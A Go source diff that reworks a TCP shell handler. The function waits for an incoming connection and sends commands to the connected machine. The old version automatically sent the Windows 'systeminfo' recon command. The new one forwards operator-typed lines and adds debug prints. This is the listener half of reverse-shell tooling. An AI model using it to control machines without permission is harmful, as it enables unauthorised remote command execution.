@@ -4,8 +4,7 @@ import (
   "fmt"
   "net"
   "bufio"
-  "time"
-  //"os"
+  //"time"
 )
 
 func ListenForConnection() net.Conn {
@@ -28,7 +27,9 @@ func ListenAndHandleTCPShell(stdreader *bufio.Reader){
   conn := ListenForConnection()
   scanner := bufio.NewScanner(conn)
   writer := bufio.NewWriter(conn)
+  defer fmt.Println("handle thead died")
   go func() {
+    defer fmt.Println("reader thread died")
     for scanner.Scan() {
       fmt.Println("scanned data")
       tcpdata := scanner.Text()
@@ -36,18 +37,20 @@ func ListenAndHandleTCPShell(stdreader *bufio.Reader){
     }
   }()
   for{
-   // text, _ := stdreader.ReadString('\n')
-   // fmt.Println("read text: " + text)
-   // if text == "yeet" {
-   //   fmt.Println("quitting")
-   //   break
-   // }
-    fmt.Println("we got here")
-    time.Sleep(3000 * time.Millisecond)
-    _, err := writer.WriteString("systeminfo\n")
+    fmt.Println("Reading text: ")
+    text, _ := stdreader.ReadString('\n')
+    fmt.Println("read text: " + text)
+    if text == "yeet" {
+      fmt.Println("quitting")
+      break
+    }
+    fmt.Println("writing text")
+    _, err := writer.WriteString(text)
+    writer.WriteString("\r\n")
     if err != nil {
       fmt.Println("write error: " + err.Error())
     }
+    fmt.Println("Flushing")
     writer.Flush()
     fmt.Println("wrote text")
   }
